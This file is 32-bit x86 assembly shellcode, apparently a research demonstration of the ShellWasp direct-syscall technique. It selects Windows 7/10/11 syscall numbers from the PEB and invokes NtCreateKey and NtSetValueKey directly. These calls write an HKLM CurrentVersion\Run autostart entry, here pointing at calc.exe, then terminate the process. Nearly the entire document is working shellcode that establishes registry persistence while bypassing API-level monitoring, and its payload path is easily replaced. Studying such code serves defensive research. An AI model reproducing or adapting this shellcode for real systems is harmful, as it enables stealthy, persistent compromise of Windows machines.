
; Author: Shelby VandenHoek (VERONA Labs)
; This was made to highlight the ShellWasp technique for syscall shellcode. Note - Shelby used a slightly earlier
; version of ShellWasp, which has since changed. His shellcode still works on Win 7, 10, and 11.

; This is a way to create persistence via registry - in this case, for calculator! 

; This is a total reworking/reimaging of an original 2005 syscall shellcode by P. Bania. The way of invoking the 
; syscall then is obsolete now, so I told Shelby (then my employee and student) to recreate it from scratch using the 
; ShellWasp technique. I had searched long and hard for any syscall shellcode that was non-Egghunter in nature, and Bania's
; was the only one that I could find. The original had used hardcoded syscall values - clearly a practice we 
; would avoid today.


; Original: http://piotrbania.com/all/articles/windows_syscall_shellcode.pdf

[bits 32]

	mov ebx,DWORD  [fs:0x30]
	mov ebx, dword  [ebx+0xac]
	mov ecx, esp
	sub esp, 0x1000
	cmp bl, 0x64            ; 21H2, Win10 release
	jl less1
	push 0x7002c            ; NtTerminateProcess
	push 0x3000f            ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less1:
	cmp bl, 0x63 			; 21h1, Win10 release
    jl less2
    push 0x7002c   			; NtTerminateProcess
    push 0x3000f			; NtClose
    push 0x60				; NtSetValueKey
    push 0x1d				; NtCreateKey
    jmp saveSyscallArray
	less2:
	cmp bl, 0x62            ; 20H2, Win10 release
	jl less3
	push 0x2c               ; NtTerminateProcess
	push 0xf                ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less3:
	cmp bl, 0xF0            ; 21H2, Win11 release
	jl less4
	push 0x7002c            ; NtTerminateProcess
	push 0x3003f            ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less4:
	cmp bl, 0x61            ; 2004, Win10 release
	jl less5
	push 0x2c               ; NtTerminateProcess
	push 0xf                ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less5:
	cmp bl, 0xBB            ; 1909, Win10 release
	jl less6
	push 0x2c               ; NtTerminateProcess
	push 0xf                ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less6:
	cmp bl, 0xBA            ; 1903, Win10 release
	jl less7
	push 0x2c               ; NtTerminateProcess
	push 0xf                ; NtClose
	push 0x60               ; NtSetValueKey
	push 0x1d               ; NtCreateKey
	jmp saveSyscallArray
	less7:
	cmp bl, 0xB1            ; Win7, Sp1 release
	jl end
	push 0x29               ; NtTerminateProcess
	push 0xc                ; NtClose
	push 0x5d               ; NtSetValueKey
	push 0x1a               ; NtCreateKey
	saveSyscallArray:
	mov edi, esp
	mov esp, ecx


	sub	esp, 0x400	; Storage for Params

; Length without NULL: 0x7e
; Length with NULL: 0x80
; UTF-16: \Registry\Machine\Software\Microsoft\Windows\CurrentVersion\Run
	xor edx, edx
	push edx
	mov dl, 0x6e
	push dx
	mov dl, 0x75
	push dx
	mov dl, 0x52
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x6e
	push dx
	mov dl, 0x6f
	push dx
	mov dl, 0x69
	push dx
	mov dl, 0x73
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x56
	push dx
	mov dl, 0x74
	push dx
	mov dl, 0x6e
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x75
	push dx
	mov dl, 0x43
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x73
	push dx
	mov dl, 0x77
	push dx
	mov dl, 0x6f
	push dx
	mov dl, 0x64
	push dx
	mov dl, 0x6e
	push dx
	mov dl, 0x69
	push dx
	mov dl, 0x57
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x74
	push dx
	mov dl, 0x66
	push dx
	mov dl, 0x6f
	push dx
	mov dl, 0x73
	push dx
	mov dl, 0x6f
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x63
	push dx
	mov dl, 0x69
	push dx
	mov dl, 0x4d
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x61
	push dx
	mov dl, 0x77
	push dx
	mov dl, 0x74
	push dx
	mov dl, 0x66
	push dx
	mov dl, 0x6f
	push dx
	mov dl, 0x53
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x6e
	push dx
	mov dl, 0x69
	push dx
	mov dl, 0x68
	push dx
	mov dl, 0x63
	push dx
	mov dl, 0x61
	push dx
	mov dl, 0x4d
	push dx
	mov dl, 0x5c
	push dx
	mov dl, 0x79
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x74
	push dx
	mov dl, 0x73
	push dx
	mov dl, 0x69
	push dx
	mov dl, 0x67
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x52
	push dx
	mov dl, 0x5c
	push dx
	mov [ebp-4], esp ; REG_PATH

; Length without NULL: 0x38
; Length with NULL: 0x3a
; UTF-16: c:\Windows\System32\calc.exe
    xor edx, edx
    push edx
    mov dl, 0x65
    push dx
    mov dl, 0x78
    push dx
    mov dl, 0x65
    push dx
    mov dl, 0x2e
    push dx
    mov dl, 0x63
    push dx
    mov dl, 0x6c
    push dx
    mov dl, 0x61
    push dx
    mov dl, 0x63
    push dx
    mov dl, 0x5c
    push dx
    mov dl, 0x32
    push dx
    mov dl, 0x33
    push dx
    mov dl, 0x6d
    push dx
    mov dl, 0x65
    push dx
    mov dl, 0x74
    push dx
    mov dl, 0x73
    push dx
    mov dl, 0x79
    push dx
    mov dl, 0x53
    push dx
    mov dl, 0x5c
    push dx
    mov dl, 0x73
    push dx
    mov dl, 0x77
    push dx
    mov dl, 0x6f
    push dx
    mov dl, 0x64
    push dx
    mov dl, 0x6e
    push dx
    mov dl, 0x69
    push dx
    mov dl, 0x57
    push dx
    mov dl, 0x5c
    push dx
    mov dl, 0x3a
    push dx
    mov dl, 0x43
    push dx
    mov [ebp-8], esp ; CALC_PATH

; Length without NULL: 0x26
; Length with NULL: 0x28
; UTF-16: Syscall Created Key
	xor edx, edx
	push edx
	mov dl, 0x79
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x4b
	push dx
	mov dl, 0x20
	push dx
	mov dl, 0x64
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x74
	push dx
	mov dl, 0x61
	push dx
	mov dl, 0x65
	push dx
	mov dl, 0x72
	push dx
	mov dl, 0x43
	push dx
	mov dl, 0x20
	push dx
	mov dl, 0x6c
	push dx
	mov dl, 0x6c
	push dx
	mov dl, 0x61
	push dx
	mov dl, 0x63
	push dx
	mov dl, 0x73
	push dx
	mov dl, 0x79
	push dx
	mov dl, 0x53
	push dx
	mov [ebp-12], esp ; VALUE_NAME

; UNICODE_STRING ValueName
	xor edx, edx
	push dword [ebp-12] ; Buffer
	mov dx, 0x28
	push dx ; Max Length
	mov dx, 0x26
	push dx ; Length
	mov [ebp-16], esp ; US_VALUE_NAME

; UNICODE_STRING REG_PATH
	xor edx, edx
	push dword [ebp-4] ; Buffer
	mov dx, 0x80
	push dx ; Max Length
	mov dx, 0x7E
	push dx ; Length
	mov [ebp-20], esp ; US_REG_PATH

; _OBJECT_ATTRIBUTES
	xor edx, edx
	xor ecx, ecx
	push edx ; SecurityQualityOfService = NULL
	push edx ; SecurityDescriptor = NULL
	inc ecx
	shl ecx, 6
	push ecx ; Attributes = OBJ_CASE_INSENSITIVE = 0x40 
    push dword [ebp-20] ; US_REG_PATH
	push edx ; Root Directory = NULL
	push 0x18 ; Length
	mov [ebp-24], esp ; OBJECT_ATTR

; KeyHandle
	xor edx, edx
	push edx
	mov [ebp-28], esp ; PKEY_HANDLE

;  Access Mask:
; KEY_ALL_ACCESS = 0xF003F
; Will Use Virtual Registry
; Computer\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
	; xor ecx, ecx
	; inc ecx ; 0x1
	; shl ecx, 4 ; 0x10
	; mov edx, ecx
	; dec ecx ; 0xF
	; shl ecx, 16 ; 0xF0000
	; shl edx, 2 ; 0x40
	; dec edx ; 0x3F
	; add ecx, edx ; 0xF0000 + 0x3F = 0xF003F 
	; mov [ebp-32], ecx ;  ACCESS_MASK

; KEY_ALL_ACCESS | KEY_WOW64_64KEY = 0xF013F
; Will Use Normal Registry
; Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	xor ecx, ecx
	inc ecx ; 0x1
	shl ecx, 4 ; 0x10
	mov edx, ecx
	dec ecx ; 0xF
	shl ecx, 16 ; 0xF0000
	shl edx, 2 ; 0x40
	dec edx ; 0x3F
	add ecx, edx ; 0xF0000 + 0x3F = 0xF003F 
	xor edx, edx
	inc edx ; 0x1
	shl edx, 8 ; 0x100
	add ecx, edx ; 0xF003F + 0x100 = 0xF013F
	mov [ebp-32], ecx

; KEY_SET_VALUE = 0x2
; Will Use Virtual Registry
; Computer\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
	; xor ecx, ecx
	; inc ecx ; 0x1
	; inc ecx ; 0x2
	; mov [ebp-32], ecx ; ACCESS_MASK

; KEY_SET_VALUE | KEY_WOW64_64KEY = 0x102
; Will Use Normal Registry
; Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	; xor ecx, ecx
	; inc ecx ; 0x1
	; shl ecx, 8 ; 0x100
	; inc ecx ; 0x101
	; inc ecx ; 0x102
	; mov [ebp-32], ecx ; ACCESS_MASK

NtCreateKey:
    push edi ; Save Syscall Array
	xor edx, edx
    push edx ; KEY_DISPOSITION = NULL
	push edx ; Create Options REG_OPTION_NON_VOLATILE = 0x0
	push edx ; Class = NULL
	push edx ; TitleIndex = 0x0
    push dword [ebp-24] ; OBJECT_ATTR
    push dword [ebp-32] ; ACCESS_MASK
    push dword [ebp-28] ; PKEY_HANDLE
	mov eax, [edi]
	call syscallFunc
	add esp, 28
    pop edi ; Get Syscall Array

    xor ecx, ecx
    cmp eax, ecx
    jne NtTerminateProcess

RegSetValueKey:
    push edi ; Save Syscall Array
    xor edx, edx
    push 0x38
    push dword [ebp-8] ; CALC_PATH
    inc edx
    push edx ; Type: REG_SZ = 0x1
    dec edx
    push edx ; Title Index = 0x0
    push dword [ebp-16] ; US_VALUE_NAME
    mov eax, [ebp-28] ; PKEY_HANDLE
    push dword [eax]
    mov eax, [edi+4]
    call syscallFunc
    add esp, 24
    pop edi ; Get Syscall Array

NtClose:
    push edi ; Save Syscall Array
    mov eax, [ebp-28] ; PKEY_HANDLE
    push dword [eax]
    mov eax, [edi+8]
    call syscallFunc
    add esp, 4
    pop edi ; Get Syscall Array


NtTerminateProcess:
    push edi ; Save Syscall Array
	xor edx, edx
	push edx
	push edx
	mov eax, [edi+12]
	call syscallFunc
    add esp, 8

jmp skipSyscall
syscallFunc:
	mov ebx,DWORD  [fs:0x30]
    mov ebx, [ebx+0xa4] ; OS Major Version
    cmp bl, 10
    jne win7 
    win10:
	    call [fs:0xc0]
	    ret 
    win7:
        xor ecx, ecx
        lea edx, [esp+4]
        call [fs:0xc0]
        add esp, 4
        ret
skipSyscall:
end:
